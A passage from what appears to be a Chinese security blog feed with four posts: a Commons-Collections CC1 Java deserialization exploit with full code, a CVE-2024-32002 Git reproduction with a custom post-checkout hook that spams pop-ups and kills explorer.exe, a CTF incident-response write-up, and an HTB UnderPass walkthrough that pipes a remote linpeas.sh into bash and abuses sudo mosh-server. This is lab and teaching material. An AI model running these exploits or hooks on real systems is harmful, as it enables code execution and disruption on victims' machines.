class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>     &#125;;<br></code></pre></td></tr></table></figure><p>现在可以整理一下</p><p>首先调用了chainedtransformer的transform方法，然后它调用了ConstantTransformer的transform方法也就是把value变成了<code>Runtime.class</code>​</p><p>运行一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803161248-arjsr50.png" alt="image"></p><p>成功执行</p><p>最终代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Target.class,transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">ObjectInputStream</span>.<span class="hljs-title function_">readObject</span>()<br><span class="hljs-title class_">AnnotationInvocationHandler</span>.<span class="hljs-title function_">readObject</span>()<br><span class="hljs-title class_">Map</span>().<span class="hljs-title function_">setValue</span>()<br>            <span class="hljs-title class_">TransformedMap</span>.<span class="hljs-property">decorateMap</span><br>                <span class="hljs-title class_">ChainedTransformer</span>.<span class="hljs-title function_">transformer</span>()<br>                    <span class="hljs-title class_">ConstantTransformer</span>.<span class="hljs-title function_">transformer</span>()<br>                        <span class="hljs-title class_">InvokerTransformer</span>.<span class="hljs-title function_">transformer</span>()<br>                            <span class="hljs-title class_">Method</span>.<span class="hljs-property">getMethod</span><br>                            getMethod.<span class="hljs-property">getRuntime</span><br>                        <span class="hljs-title class_">InvokerTransformer</span>.<span class="hljs-title function_">transformer</span>()<br>                            <span class="hljs-title class_">Method</span>.<span class="hljs-property">invoke</span><br>                            <span class="hljs-title class_">Runtime</span>.<span class="hljs-property">getRuntime</span><br>                        <span class="hljs-title class_">InvokerTransformer</span>.<span class="hljs-title function_">transformer</span>()<br>                            <span class="hljs-title class_">Method</span>.<span class="hljs-property">exec</span><br>                            <span class="hljs-title class_">Runtime</span>.<span class="hljs-property">getRuntime</span>.<span class="hljs-property">exec</span><br></code></pre></td></tr></table></figure><p>至此Java反序列化的第一个链子就算完成了，这应该是比较重要的一条链子，从0到1总是困难的，所以这个分析了很久，也感觉有点吃力，归根到底可能还是基础比较薄弱</p><p>Java反射这部分当初没有写代码实操，只是简单的读了一些文章，记了笔记感觉是懂了，但现在回头一看感觉写的很抽象没有什么自己的理解在里面，决定还是要敲一敲代码实践一下</p><p>任重道远，希望通过接下来分析一些常见的链子能够越来越熟练吧！</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-32002漏洞复现</title>
    <link href="/post/cve202432002-vulnerability-reappears-1a0e2n.html"/>
    <url>/post/cve202432002-vulnerability-reappears-1a0e2n.html</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2024-32002漏洞复现"><a href="#CVE-2024-32002漏洞复现" class="headerlink" title="CVE-2024-32002漏洞复现"></a>CVE-2024-32002漏洞复现</h1><h1 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h1><p>CVE-2024-32002 是在 Git 软件中发现的一个严重安全漏洞。该漏洞允许远程攻击者通过特制的 Git 仓库在受影响的系统上执行任意代码。此漏洞存在于 Git 处理特定仓库操作的过程中，由于缺乏对输入数据的充分验证，导致了远程代码执行（RCE）的风险。当用户使用管理员权限执行git clone克隆一个恶意仓库时，git中存在的漏洞会触发远程代码执行</p><p>攻击者可以创建恶意的仓库，诱导使用git的用户clone，从而在客户端执行任意的系统命令</p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul><li>version 2.45.*&lt; 2.45.1</li><li>version 2.44.*&lt; 2.44.1</li><li>version 2.43.*&lt; 2.43.4</li><li>version 2.42.*&lt; 2.42.2</li><li>version 2.41.*&lt; 2.41.1</li><li>version 2.40.*&lt; 2.40.2</li><li>version 2.39.*&lt; 2.39.4</li></ul><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>成功利用此漏洞可能导致：</p><ul><li><strong>远程代码执行（RCE）</strong> ：攻击者能够在受影响的系统上执行任意代码。</li><li><strong>系统控制</strong>：攻击者可能获得受影响系统的完全控制权。</li><li><strong>数据泄露和篡改</strong>：未经授权的访问和修改敏感数据。</li><li><strong>进一步攻击</strong>：在受害者网络内发起进一步的攻击。</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>1.准备存在漏洞的 Git 版本</p><p><a href="https://github.com/git-for-windows/git/releases?page=7">https://github.com/git-for-windows/git/releases?page=7</a></p><p>我这里选择的是2.39.1版本，一直点击下一步进行安装</p><p>2.生成ssh密钥</p><p>​<code>ssh-keygen -t ed25519 -C &quot;对应的邮箱&quot;</code>​</p><p>3.使用more命令查看ssh公钥文件</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250720222716-9n9q4ym.png" alt="image"></p><p>4.在GitHub中配置ssh公钥</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250720222842-9nx7a7v.png" alt="image"></p><p>5.开启Git中的符号链接支持</p><p>用<strong>管理员权限</strong>打开CMD，运行</p><p>​<code>git config --global core.symlinks true</code>​</p><p>环境配置完成</p><p>6.克隆恶意仓库，触发漏洞</p><p>​<code>git clone --recursive git@github.com:10cks/captain.git</code>​</p><p>计算器成功弹出复现成功</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250720223615-v4we3kw.png" alt="image"></p><p>漏洞具体讲解</p><p><a href="https://forum.butian.net/share/3040">https://forum.butian.net/share/3040</a></p><h1 id="一些修改"><a href="#一些修改" class="headerlink" title="一些修改"></a>一些修改</h1><p>由于本人准备拿这个cve要给新生做一个技术演示，所以便将整体代码进行fork然后修改了post-checkout</p><p>将post-checkout修改过后的代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># post-checkout hook: every time you git checkout, spawn the popup.vbs</span><br><br><span class="hljs-comment"># 先确保 vbs 文件存在</span><br>VB=<span class="hljs-string">&quot;<span class="hljs-variable">$TEMP</span>/popup.vbs&quot;</span><br><span class="hljs-built_in">cat</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$VB</span>&quot;</span> &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span><br>Dim i<br>i = 1000<br>Do<br>  response = MsgBox(<span class="hljs-string">&quot;You have been hacked. Exit now?&quot;</span>, vbOKCancel + vbExclamation, <span class="hljs-string">&quot;System Warning&quot;</span>)<br>  If response = vbCancel Then<br>    i = i - 100<br>    If i &lt; 100 Then i = 100<br>  ElseIf response = vbOK Then<br>    Set objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>    objShell.Run <span class="hljs-string">&quot;taskkill /f /im explorer.exe&quot;</span>, 0, False<br>    WScript.Quit<br>  End If<br>  WScript.Sleep i<br>Loop<br>EOF<br><br><span class="hljs-comment"># 然后异步启动多份</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 10); <span class="hljs-keyword">do</span><br>  <span class="hljs-comment"># 在 Windows 下，用 cmd /c start 来让它跑在后台</span><br>  cmd //C start <span class="hljs-string">&quot;&quot;</span> wscript.exe <span class="hljs-string">&quot;<span class="hljs-variable">$VB</span>&quot;</span><br>  <span class="hljs-built_in">sleep</span> 1<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>效果为一直弹窗十次，点击确认便会杀掉桌面进程，取消则会加快弹窗速度</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第二届帕鲁杯应急响应——畸形的爱</title>
    <link href="/post/the-second-palu-cup-emergency-response---deformed-love-z24yigc.html"/>
    <url>/post/the-second-palu-cup-emergency-response---deformed-love-z24yigc.html</url>
    
    <content type="html"><![CDATA[<h1 id="第二届帕鲁杯应急响应——畸形的爱"><a href="#第二届帕鲁杯应急响应——畸形的爱" class="headerlink" title="第二届帕鲁杯应急响应——畸形的爱"></a>第二届帕鲁杯应急响应——畸形的爱</h1><h2 id="提交攻击者ip1"><a href="#提交攻击者ip1" class="headerlink" title="提交攻击者ip1"></a>提交攻击者ip1</h2><p>查看webserver的nginx日志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">（Nginx 日志是 Nginx Web 服务器记录的运行数据，用于监控访问行为、排查错误、分析流量和调试问题。）<br>存在访问日志和错误日志<br>访问日志记录每个请求的信息，包括访问者 IP、访问时间、请求方式、状态码、请求资源等（默认路径/var/log/nginx/access.log）<br>错误日志记录Nginx 在运行中遇到的错误信息，包括配置错误、请求处理失败、后端服务不可用等。（默认路径/var/log/nginx/error.log）<br>配置<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">access_log /var/log/nginx/access.log;</span><br><span class="hljs-string">error_log /var/log/nginx/error.log;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603205127-yuaf36n.png" alt="image"></p><p>攻击ip为192.168.31.240</p><h2 id="提交攻击者ip2"><a href="#提交攻击者ip2" class="headerlink" title="提交攻击者ip2"></a>提交攻击者ip2</h2><p>查看容器中是否有异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo -i<br>docker ps -a<br>docker <span class="hljs-built_in">exec</span> -it ec87eb8a81c7 /<span class="hljs-built_in">bin</span>/sh<br>ls<br>cat clean.sh<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603211711-lo5l6ur.png" alt="image"></p><p>反弹shell脚本，攻击者ip为192.168.31.11</p><h2 id="暴力破解开始时间"><a href="#暴力破解开始时间" class="headerlink" title="暴力破解开始时间"></a>暴力破解开始时间</h2><p>查看docker容器对应的所有日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bin"># 查看phpmyadmin容器日志<br>docker logs 6801404902b1           # 查看所有日志<br>docker logs -f phpmyadmin          # 实时查看日志（按Ctrl+C退出）<br>docker logs --tail 10 phpmyadmin   # 查看最近10行日志<br>docker logs --since 10m phpmyadmin # 查看10分钟内的日志<br>docker logs --since &quot;2025-05-01T12:00:00&quot; phpmyadmin # 查看指定时间后的日志<br><br># 查看WebData容器日志<br>docker logs ec87eb8a81c7           # 查看所有日志<br>docker logs -f WebData             # 实时查看日志<br>docker logs --tail 20 WebData      # 查看最近20行日志<br>docker logs --since 30m WebData    # 查看30分钟内的日志<br><br># 查看socks5-open容器日志<br>docker logs 192686b818fc           # 查看所有日志<br>docker logs -f socks5-open         # 实时查看日志<br>docker logs --tail 15 socks5-open  # 查看最近15行日志<br>docker logs --since &quot;2025-05-15&quot; socks5-open # 查看指定日期后的日志<br></code></pre></td></tr></table></figure><p>最后在phpmyadmin容器日志中找到</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604113040-w5l74t2.png" alt="image"></p><p>​<code>palu&#123;2025:03:05:58&#125;</code>​</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>也是非常良心了，有一个everything可以查找</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603213154-5lfqcj8.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603213325-t7fgy4q.png" alt="image"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603213528-w3xiu2s.png" alt="image"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>感觉很难找，因为以为还会在windows10里面，结果又回到了sql里面</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603221000-0663v69.png" alt="image"></p><p>数据库进行连接</p><p>​<code>mysql -u root -p</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604102451-6inueu3.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604102640-9r5vxxx.png" alt="image"></p><h2 id="钓鱼文件的哈希32位大写"><a href="#钓鱼文件的哈希32位大写" class="headerlink" title="钓鱼文件的哈希32位大写"></a>钓鱼文件的哈希32位大写</h2><p>回收站里面有一个简历.zip，还原一下，里面是简历.exe</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604113547-ebj70kf.png" alt="image"></p><p>一看就是钓鱼文件</p><p>MD5加密一下</p><p>palu{2977CDAB8F3EE5EFDDAE61AD9F6CF203}</p><h2 id="webshell密码1"><a href="#webshell密码1" class="headerlink" title="webshell密码1"></a>webshell密码1</h2><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603215013-rkxy8wk.png" alt="image"></p><h2 id="提交攻击者留下的webshell密码2"><a href="#提交攻击者留下的webshell密码2" class="headerlink" title="提交攻击者留下的webshell密码2"></a>提交攻击者留下的webshell密码2</h2><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250603210309-ucmd682.png" alt="image"></p><h2 id="溯源-攻击者的邮箱"><a href="#溯源-攻击者的邮箱" class="headerlink" title="[溯源]攻击者的邮箱"></a>[溯源]攻击者的邮箱</h2><p>再将project2.exe丢进云沙箱的时候可以看到PDB中泄漏了黑客的名字</p><p>​<code>C:Users\n0k4u\source\repos\Project2\x64\Release\Project2.pdb</code>​</p><p>可以进行社工</p><p>获取目标 Github 用户名，替换下面链接中的<code>&lt;name&gt; </code>​进行查询：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://api.github.com/users/&lt;name&gt;/events/public<br></code></pre></td></tr></table></figure><p>github 接口拼接泄露邮箱</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604111828-9hdnqt8.png" alt="image"></p><p>参考文章</p><p><a href="https://blog.csdn.net/fishfishfishman/article/details/141320003">https://blog.csdn.net/fishfishfishman/article/details/141320003</a></p><h2 id="提交溯源后得到的flag"><a href="#提交溯源后得到的flag" class="headerlink" title="提交溯源后得到的flag"></a>提交溯源后得到的flag</h2><p>在n0k4u的github仓库中有qq号</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604111802-igrl3iz.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250604111512-t7utfng.png" alt="image"></p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
      <tag>帕鲁杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_UnderPass</title>
    <link href="/post/htbunderpass-1xg2cp.html"/>
    <url>/post/htbunderpass-1xg2cp.html</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-UnderPass"><a href="#HTB-UnderPass" class="headerlink" title="HTB_UnderPass"></a>HTB_UnderPass</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>先扫描一下开放端口</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410155350-1aieemx.png" alt="image"></p><p>开放了这两个端口，先将80端口的域名添加到&#x2F;etc&#x2F;hosts</p><p>访问一下，是一个apache2的默认页面</p><p>刚刚默认扫描的是TCP协议的，再扫描一下UDP协议下开放的端口号</p><p>这里UDP协议本来就不太可靠，所以选择T3进行扫描</p><p>​<code>nmap -sU underpass.htb -T3</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410162657-hmwdnji.png" alt="image"></p><p>UDP开放端口：161，开启服务SNMP</p><h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><p>​<code>snmp-check 10.10.11.48</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410161502-hpg0435.png" alt="image"></p><p>发现了两个信息</p><p>1.Web 服务运行着 daloradius</p><p>2.用户名为<a href="mailto:&#x73;&#116;&#x65;&#118;&#x65;&#64;&#x75;&#100;&#101;&#x72;&#112;&#97;&#115;&#115;&#46;&#x68;&#116;&#98;">steve@uderpass.htb</a></p><h2 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h2><p>​<code>dirsearch -u http://underpass.htb/daloradius</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410162613-79q543g.png" alt="image"></p><p>再扫描一下app目录</p><p>​<code>dirsearch -u http://underpass.htb/daloradius/app</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410163016-xuzlntg.png" alt="image"></p><p>扫出来了一个登录界面</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410163046-a4u8yhj.png" alt="image"></p><p>但这只是用户登录界面，更想要找的是后台</p><p>所以可能是字典的问题，导致没有扫描出来后台目录，换一个更全的字典</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410164847-jm2vfyh.png" alt="image"></p><p>又扫描出来了一个目录</p><p>再进行进一步的扫描</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410165554-8ipj7a0.png" alt="image"></p><p>后台管理系统一般有默认密码，可以上网上搜一下，如果在断网的环境下应该也会存在某个目录下面，可以找一下</p><p>默认密码为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">username: administrator<br>password: radius<br></code></pre></td></tr></table></figure><p>成功登陆</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410165639-2wlpuxn.png" alt="image"></p><h1 id="进入后台管理系统"><a href="#进入后台管理系统" class="headerlink" title="进入后台管理系统"></a>进入后台管理系统</h1><p>在User Listing发现了一个用户名和密码</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250410170035-bbl85ar.png" alt="image"></p><p>将Password存入<code>underpass.hash</code>​用hashcat进行破解</p><p>​<code>hashcat -a 0 -m 0 underpass.hash /home/dream/桌面/rockyou.txt</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413170212-29dgs0r.png" alt="image"></p><p>破解成功</p><p>成功登陆，拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413170331-ye3nm2h.png" alt="image"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先尝试一下<code>sudo -l</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413170948-jlcfukv.png" alt="image"></p><p>执行<code>sudo /usr/bin/mosh-server bash</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413171306-vhp9xpn.png" alt="image"></p><p>提权失败</p><p>在试探了多种方式后无果，准备用linpeas.sh</p><p>在攻击机上下载linpeas.sh，进入所在目录，开启监听</p><p>​<code>python3 -m http.server 8000</code>​</p><p>然后在靶机上</p><p>​<code>curl http://攻击机ip:8000/linpeas.sh | bash</code>​</p><p>发现</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413172748-502ptgd.png" alt="image"></p><p>所以兜兜转转还是它有问题</p><p>查看mosh</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250413174132-v8fekld.png" alt="image"></p><ul><li>当前用户 <code>svcMosh</code>​ <strong>具有 sudo 执行</strong>  <strong>​<code>/usr/bin/mosh-server</code>​</strong>​ <strong>的权限</strong>（免密码 <code>NOPASSWD</code>​）。</li><li>因此通过自定义 <code>--server=&quot;sudo /usr/bin/mosh-server&quot;</code>​</li></ul><p>可以让 mosh-client 连接自己，并以 sudo 权限运行 mosh-server</p><p>​<code>mosh --server=&quot;sudo /usr/bin/mosh-server&quot; localhost</code>​</p><p>成功连接</p><p><img 